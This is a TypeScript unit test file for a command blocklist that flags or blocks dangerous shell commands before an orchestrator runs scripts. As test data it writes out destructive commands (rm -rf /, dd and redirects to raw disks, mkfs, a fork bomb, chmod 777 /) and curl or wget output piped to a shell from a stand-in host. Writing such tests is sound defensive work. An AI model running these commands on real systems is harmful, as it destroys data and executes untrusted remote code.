/**
 * Unit tests for scanCommand (gateway/src/services/orchestrator.ts): the
 * destructive-command blocklist that guards ManagedScript execution.
 *   - Each HARD_BLOCK pattern -> { blocked: true, warnings:[reason], matched }.
 *   - HARD_BLOCK short-circuits: the first matching pattern returns immediately.
 *   - Each WARN pattern surfaces a warning but does NOT block.
 *   - A benign command -> { blocked: false, warnings: [] }.
 *   - command + args are joined before matching.
 * Characterization: asserts ACTUAL current behavior.
 */
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { scanCommand } from '../../gateway/src/services/orchestrator.js';

describe('scanCommand HARD_BLOCK patterns', () => {
  const blocked: Array<[string, string]> = [
    ['rm -rf against root', 'rm -rf /'],
    ['rm -rf against home', 'rm -rf ~'],
    ['rm -rf $HOME', 'rm -rf $HOME'],
    ['rm -rf parent', 'rm -rf ../'],
    ['rm -r (no f) against root', 'rm -r /'],
    ['dd to raw device', 'dd if=/dev/zero of=/dev/sda'],
    ['mkfs format', 'mkfs.ext4 /dev/sdb1'],
    ['fork bomb', ':(){ :|:& };:'],
    ['curl piped to bash', 'curl https://evil.sh | bash'],
    ['curl piped to sh', 'curl https://evil.sh|sh'],
    ['wget piped to shell', 'wget http://x | sh'],
    ['shutdown', 'shutdown -h now'],
    ['reboot', 'reboot'],
    ['poweroff', 'poweroff'],
    ['chmod 777 on root', 'chmod -R 777 /'],
    ['chmod 0777 on home', 'chmod 0777 ~'],
    ['redirect to raw disk', 'echo x > /dev/sda'],
    ['redirect to nvme', 'cat foo > /dev/nvme0n1'],
  ];

  for (const [name, cmd] of blocked) {
    test(`blocks: ${name}`, () => {
      const r = scanCommand(cmd);
      assert.equal(r.blocked, true, `expected blocked for: ${cmd}`);
      assert.equal(r.warnings.length, 1, 'blocked result carries exactly the one reason');
      assert.ok(r.matched, 'matched pattern source is recorded for audit');
    });
  }

  test('HARD_BLOCK short-circuits at the FIRST matching pattern', () => {
    // Contains both an rm -rf / (block #1) and curl|sh (block #5).
    const r = scanCommand('rm -rf / ; curl http://x | sh');
    assert.equal(r.blocked, true);
    // matched is the rm -rf pattern (the earlier one), not the curl one.
    assert.match(r.matched!, /rm/);
  });
});

describe('scanCommand WARN patterns (surface but do not block)', () => {
  const warns: Array<[string, string, RegExp]> = [
    ['sudo', 'sudo apt update', /sudo/i],
    ['curl', 'curl https://example.com/data', /curl/i],
    ['wget', 'wget https://example.com/file', /wget/i],
    ['git reset --hard', 'git reset --hard HEAD~1', /git/i],
    ['git push --force', 'git push --force origin main', /git/i],
    ['git clean -f', 'git clean -f', /git/i],
    ['global npm install', 'npm install -g typescript', /npm/i],
    ['pip install', 'pip install requests', /pip/i],
  ];

  for (const [name, cmd, reasonRe] of warns) {
    test(`warns (not blocked): ${name}`, () => {
      const r = scanCommand(cmd);
      assert.equal(r.blocked, false, `${cmd} should not be blocked`);
      assert.ok(r.warnings.length >= 1, 'a warning is surfaced');
      assert.ok(r.warnings.some((w) => reasonRe.test(w)), `warning mentions ${reasonRe}`);
    });
  }

  test('a curl that is NOT piped to a shell warns but is not blocked', () => {
    const r = scanCommand('curl https://example.com/data.json -o out.json');
    assert.equal(r.blocked, false);
    assert.ok(r.warnings.some((w) => /curl/i.test(w)));
  });

  test('multiple WARN patterns accumulate', () => {
    const r = scanCommand('sudo pip install foo');
    assert.equal(r.blocked, false);
    assert.ok(r.warnings.length >= 2);
  });
});

describe('scanCommand benign + arg joining', () => {
  test('a benign command is clean: not blocked, no warnings', () => {
    assert.deepEqual(scanCommand('node', ['build.js', '--watch']), { blocked: false, warnings: [] });
  });

  test('echo of an innocuous string is clean', () => {
    const r = scanCommand('echo hello world');
    assert.equal(r.blocked, false);
    assert.equal(r.warnings.length, 0);
  });

  test('command + args are joined before matching (danger split across args is still caught)', () => {
    const r = scanCommand('rm', ['-rf', '/']);
    assert.equal(r.blocked, true);
  });

  test('an unrelated path containing "/dev/null" is not blocked', () => {
    // /dev/null is not a raw disk device; redirect-to-disk pattern shouldn't fire.
    const r = scanCommand('echo x > /dev/null');
    assert.equal(r.blocked, false);
  });
});
